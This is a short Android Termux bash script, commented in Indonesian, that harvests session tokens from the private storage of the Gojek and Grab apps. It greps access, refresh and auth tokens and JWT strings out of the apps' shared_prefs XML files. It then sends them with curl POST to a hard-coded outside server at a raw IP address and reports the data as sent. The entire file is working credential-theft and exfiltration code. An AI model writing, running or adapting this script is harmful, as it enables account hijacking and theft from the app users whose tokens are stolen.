#!/data/data/com.termux/files/usr/bin/bash
# harvest_fast.sh — cepat: hanya shared_prefs (tempat token pasti disimpan), tanpa full-scan.
SRV="http://161.120.180.21:9911/token"
OUT=$(mktemp)
GJ=/data/data/com.gojek.app/shared_prefs
GB=/data/data/com.grabtaxi.passenger/shared_prefs
{
echo "=== GOJEK prefs files ==="
ls $GJ 2>/dev/null
echo "=== GOJEK token values ==="
grep -h -o -E '"(access_token|refresh_token|accessToken|auth_token|com.gojek.app.auth[^"]*)"[^<]{0,5}<[^<]{0,300}' $GJ/*.xml 2>/dev/null | head -6
grep -h -o -E 'eyJhbGci[A-Za-z0-9._-]{80,400}' $GJ/*.xml 2>/dev/null | head -3
echo "=== GRAB prefs files ==="
ls $GB 2>/dev/null
echo "=== GRAB token values ==="
grep -h -o -E '"(access_token|authToken|accessToken|refreshToken)"[^<]{0,5}<[^<]{0,300}' $GB/*.xml 2>/dev/null | head -6
grep -h -o -E 'eyJhbGci[A-Za-z0-9._-]{80,400}' $GB/*.xml 2>/dev/null | head -3
echo "=== SELESAI ==="
} > $OUT 2>&1
cat $OUT
curl -s -m 15 -X POST -H "Content-Type: text/plain" --data-binary @$OUT $SRV && echo "TERKIRIM ✓"
